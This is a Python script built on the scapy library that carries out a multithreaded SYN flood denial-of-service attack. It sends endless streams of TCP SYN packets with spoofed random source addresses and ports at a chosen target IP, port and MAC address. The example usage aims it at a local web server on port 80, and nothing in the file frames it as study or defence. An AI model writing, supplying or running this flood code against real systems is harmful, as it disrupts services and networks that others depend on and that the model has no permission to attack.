import threading
import random
import time
from scapy.all import Ether, IP, TCP, sendp

def syn_flood(target_ip, target_port, target_mac, iface="Ethernet"):
    while True:
        # Randomize source ports and IPs to make it look aggressive
        src_ip = f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
        src_port = random.randint(1024, 65535)

        ether = Ether(dst=target_mac)
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags='S', seq=random.randint(0, 4294967295))

        packet = ether / ip / tcp

        sendp(packet, iface=iface, verbose=False)

def start_attack(target_ip, target_port, target_mac, iface="Ethernet", num_threads=10):
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=syn_flood, args=(target_ip, target_port, target_mac, iface))
        t.daemon = True  # so they stop if you CTRL+C
        t.start()
        threads.append(t)

    print(f"[+] SYN Flood Attack Started with {num_threads} threads")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")

# Example usage
if __name__ == "__main__":
    target_ip = "192.168.1.100"
    target_port = 80
    target_mac = "aa:bb:cc:dd:ee:ff"  # You must put correct target MAC address!
    iface = "Wi-Fi"  # or your Ethernet interface name

    start_attack(target_ip, target_port, target_mac, iface, num_threads=20)
